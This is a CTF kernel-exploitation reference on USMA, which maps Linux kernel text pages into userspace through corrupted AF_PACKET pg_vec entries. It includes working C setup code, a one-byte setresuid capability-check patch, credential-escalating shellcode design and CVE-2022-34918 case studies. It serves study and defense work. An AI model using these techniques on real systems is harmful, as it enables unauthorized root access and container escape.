# CTF Pwn - USMA (User-Space Mapping Attack)

USMA is the shortest path from "I can overwrite 8 bytes of a kernel heap object" to "I am root" when the target has CFI, CET, or simply no usable gadgets. It does not hijack a function pointer at all: it makes the kernel map one of its own text pages into userspace, and patches the code directly.

**Not the same thing as page-UAF chains.** USMA maps a *kernel text page that is still allocated*, through `vm_insert_page`; it never frees or recycles a page, never touches page tables, and needs no race. Techniques that free a physical page and re-claim it as a PTE page or `pipe_buffer` (cross-cache, the `io_uring` PBUF UAF) share only the phrase "map kernel memory". Conflating the two gives an exploit that does nothing - if a write-up describes USMA as "reuse the freed page as a page table", it is describing a different technique.

## Why CFI does not stop it

kCFI (`CONFIG_CFI_CLANG`) puts a type hash before every indirectly-callable function and checks it at each indirect call site. Every classic pivot - fake vtable, `ops->func`, `seq_operations->start`, `modprobe_path` + `call_usermodehelper` - is an indirect call to an attacker-chosen target, so it has to match a type hash, and gadgets never do.

USMA never redirects a call. It corrupts a `pg_vec` entry so that `packet_mmap()` maps a kernel page into the attacker's address space; the attacker then patches a branch inside a function that a **legitimate** syscall already invokes (for example the `ns_capable_setid` check in `__sys_setresuid`). Call sites, type hashes and the vtable layout are untouched, so there is nothing for CFI to check. The same property removes the usual prerequisites: no ROP, no stack pivot, and - with the `__ksymtab` variant below - no symbol offsets either.

## Mechanism

`setsockopt(fd, SOL_PACKET, PACKET_RX_RING, &req, sizeof(req))` on an `AF_PACKET`/`SOCK_RAW` socket calls `packet_set_ring()` -> `alloc_pg_vec()` (net/packet/af_packet.c):

```c
struct pgv { char *buffer; };            /* 8 bytes */

pg_vec = kcalloc(block_nr, sizeof(struct pgv), GFP_KERNEL | __GFP_NOWARN);
for (i = 0; i < block_nr; i++)
    pg_vec[i].buffer = alloc_one_pg_vec_page(order);   /* a kernel direct-map VA */
```

`packet_mmap()` then walks that array and inserts every page into a user VMA:

```c
for (i = 0; i < rb->pg_vec_len; i++) {
    void *kaddr = rb->pg_vec[i].buffer;
    for (pg_num = 0; pg_num < rb->pg_vec_pages; pg_num++) {
        page = pgv_to_page(kaddr);
        err = vm_insert_page(vma, start, page);   /* MAP_SHARED */
        start += PAGE_SIZE; kaddr += PAGE_SIZE;
    }
}
```

So the array is a list of "pages the kernel will map to me". Corrupt the eight-byte `buffer` pointers to point at kernel text/rodata and the next `mmap()` gives you those pages read-write in userspace - the direct-map alias is writable even though the text mapping itself is read-only.

`vm_insert_page()` validates the page first:

```c
static int validate_page_before_insert(struct page *page)
{
    if (PageAnon(page) | PageSlab(page) | page_has_type(page))
        return -EINVAL;
    ...
}
```

`page_has_type` covers the `PG_buddy` / `PG_offline` / `PG_table` / `PG_guard` page-type flags. Kernel `.text`/`.rodata` pages come straight from the buddy allocator and are none of those, so they pass every check - which is exactly why USMA targets code pages rather than heap objects.

**Requirements**

- A write primitive over a `pg_vec` array: heap overflow, UAF reclaim, double free, or a relative write. The array is `8 * tp_block_nr` bytes, so `tp_block_nr` selects the cache (`0x130/8` -> kmalloc-512).
- `CAP_NET_RAW` for `AF_PACKET`: `unshare(CLONE_NEWUSER | CLONE_NEWNET)` plus `uid_map`/`gid_map` first.
- The target page must be part of the direct map (any kernel text/rodata/global works; vmalloc addresses do not).
- `pg_vec` is `GFP_KERNEL`, so it can only reclaim a `GFP_KERNEL` victim - not a `kmalloc-cg-*` one.

## Setting it up

```c
void unshare_setup(void) {
    char buf[0x100]; int fd;
    unshare(CLONE_NEWNS | CLONE_NEWUSER | CLONE_NEWNET);
    fd = open("/proc/self/setgroups", O_WRONLY); write(fd, "deny", 4); close(fd);
    fd = open("/proc/self/uid_map", O_WRONLY);
    snprintf(buf, sizeof(buf), "0 %d 1", getuid()); write(fd, buf, strlen(buf)); close(fd);
    fd = open("/proc/self/gid_map", O_WRONLY);
    snprintf(buf, sizeof(buf), "0 %d 1", getgid()); write(fd, buf, strlen(buf)); close(fd);
}

/* block_nr struct pgv entries = block_nr pages of order-0 */
int alloc_pgv(unsigned int block_nr, unsigned int block_size) {
    int s = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    int v = TPACKET_V3;
    setsockopt(s, SOL_PACKET, PACKET_VERSION, &v, sizeof(v));

    struct tpacket_req3 req = {0};
    req.tp_block_size = block_size;              /* 0x1000 -> one page per entry */
    req.tp_block_nr   = block_nr;
    req.tp_frame_size = block_size / 2;
    req.tp_frame_nr   = (block_size * block_nr) / req.tp_frame_size;
    req.tp_retire_blk_tov = 100;
    setsockopt(s, SOL_PACKET, PACKET_RX_RING, &req, sizeof(req));

    struct sockaddr_ll sa = {0};
    sa.sll_family = PF_PACKET; sa.sll_protocol = htons(ETH_P_ALL);
    sa.sll_ifindex = if_nametoindex("lo");
    bind(s, (struct sockaddr *)&sa, sizeof(sa));
    return s;
}

/* after the pg_vec entries point at the target page: */
int packet_fd = alloc_pgv(block_nr, 0x1000);
char *page = mmap(NULL, 0x1000 * block_nr, PROT_READ | PROT_WRITE, MAP_SHARED, packet_fd, 0);
page[target & 0xfff] = 0xeb;      /* e.g. jnz -> jmp */
```

Two details that decide whether the spray lands:

- `packet_set_ring()` allocates a **0x20 object just before** the `pg_vec` array. When the victim is kmalloc-32, absorb that noise first (`shm_file_data` via `shmget`/`shmat`, or any 0x20 `GFP_KERNEL` object).
- The array's first qword is the SLUB freelist pointer while the chunk is free; with `setxattr + userfaultfd` fill, make sure the bytes at the freelist offset are **not** in the faulting page (kmalloc-512 keeps it at `0x108`).

## Which page to patch

Take `vmlinux` (`extract-vmlinux bzImage > vmlinux`, then `vmlinux-to-elf` to restore symbols), find the check, and compute `target & ~0xfff` for the array entries while patching at `target & 0xfff`:

```asm
; __sys_setresuid, after the capability check
call ns_capable_setid
test al, al
jnz  short 0xffffffff81087044    ; 0x75 XX  ->  patch 0x75 to 0xeb (jmp)
```

Patching `jnz` to `jmp` makes the capability check irrelevant: any user may `setresuid(0,0,0)`. Equivalent one-byte wins: skip a `cmp`/`test` result with `jmp`, patch a `ret` early, or patch a comparison immediate. Keep the original bytes and restore them when the function is on a hot path.

## Finding the address

Three routes, in increasing order of portability:

1. **`user_key_payload.rcu.func`** - `keyctl(KEYCTL_REVOKE)` writes `user_free_payload_rcu` into `rcu.func`; an OOB read of the payload (after enlarging `datalen`) leaks a `.text` pointer, hence the base.
2. **`fs_context`** - spray it with `fsopen()`, then read `ops` (rodata -> text base) and `cred` (the mount caller's `struct cred *`, no arithmetic needed). See [kernel-objects.md](kernel-objects.md#fs_context-kmalloc-192-gfp_kernel-until-514-_account-after).
3. **Offset-free shellcode** - do not compute any symbol address at all. Patch a function that a normal syscall reaches (for example `fs_context_operations.parse_param`, triggered by `fsconfig(fd, FSCONFIG_SET_STRING, ...)`) with C/asm that:
   - finds `commit_creds` by scanning `.rodata` for the string `"commit_creds"`, then solving `&__ksymtab_name + name_offset == &__kstrtab_...` (`struct kernel_symbol { int value_offset, name_offset, namespace_offset; }`) and adding `value_offset`;
   - calls `prepare_kernel_cred(0)` + `commit_creds()`;
   - for namespace escape: `find_vpid(1)` + `pid_task(pid, PIDTYPE_PID)` (both exported) instead of `find_task_by_vpid`, then overwrite `task->nsproxy` with `init_nsproxy`, located by pointer signature: `init_pid_ns` is exported, it contains `&init_task`, `init_task` contains a pointer that is neither itself nor `init_pid_ns` but points to a structure holding both `&init_pid_ns` and `&init_uts_ns`.
   - returns, and the caller restores the original bytes.
   This is the variant that does not need the kernel version at all - only that the symbols are exported and the structure layout is close enough for the signature scan.

## Case studies

- **CVE-2022-34918 (netfilter `nft_set_elem` heap overflow)** - overflow a `user_key_payload.datalen` for an OOB read, leak via `rcu.func`, spray `fs_context` for `ops`+`cred`, then patch `fs_context_operations.parse_param` with a credential-fixing shellcode and trigger it with `fsconfig()`. Works on a 5.x kernel where `fs_context` is still `GFP_KERNEL`.
- **N1CTF 2022 praymoon** - kmalloc-512 double free, `CONFIG_MEMCG_KMEM=y` so only `GFP_KERNEL` objects are usable: `pg_vec` (512) reclaims the slot, `setxattr + userfaultfd` rewrites every `buffer` to the page containing `__sys_setresuid`, `mmap` + `0x75 -> 0xeb`, parent calls `setresuid(0,0,0)`.
- **NCTF 2023 x1key** - only a 32-bit "add to the previous chunk" write, no free. Place a 0x20 `pg_vec` after the object, use the masked add (`p[i] &= 0xFFFFFFFFF0000000; p[i] += content`) to point it at the direct-map alias of `modprobe_path`, brute-force the low bits until the mapping contains `"/sbin/modprobe"`, then `strcpy(page, "/tmp/x")`.

## Pitfalls

- `mmap` must use `MAP_SHARED` and length `0x1000 * block_nr`; a private mapping gives you a copy.
- Only pages from the buddy allocator pass `validate_page_before_insert`; slab and anonymous pages are rejected, so "map the object itself" is not an option.
- The direct-map alias is writable on stock kernels; a hardened build that also maps the alias read-only turns the store into a fault - verify on the target before relying on the patch.
- Keep and restore the patched bytes if the function runs again (or patch a branch that is only used once).
- If the write primitive is a partial overwrite, the high bits of `buffer` stay heap-like: brute-force the low bits (`i << 20 | 0x2a000` in the NCTF case) and check for a recognizable string in the mapping.
- `close(packet_fd)` frees both the array and every page it references; do not close while a mapping is in use.

## References

- 360 Black Hat Asia 2022, "USMA: 用户态映射攻击" - <https://vul.360.net/archives/391>
- veritas501, "基于 USMA 的内核通用 EXP 编写思路在 CVE-2022-34918 上的实践" - <https://veritas501.github.io/2022_08_11_%E5%9F%BA%E4%BA%8EUSMA%E7%9A%84%E5%86%85%E6%A0%B8%E9%80%9A%E7%94%A8EXP%E7%BC%96%E5%86%99%E6%80%9D%E8%B7%AF%E5%9C%A8%20CVE-2022-34918%20%E4%B8%8A%E7%9A%84%E5%AE%9E%E8%B7%B5/>
- Ltfall, "Linux kernel 基础：USMA" - <https://ltfa1l.top/2025/02/25/system/kernel/Linux_kernel8_USMA>
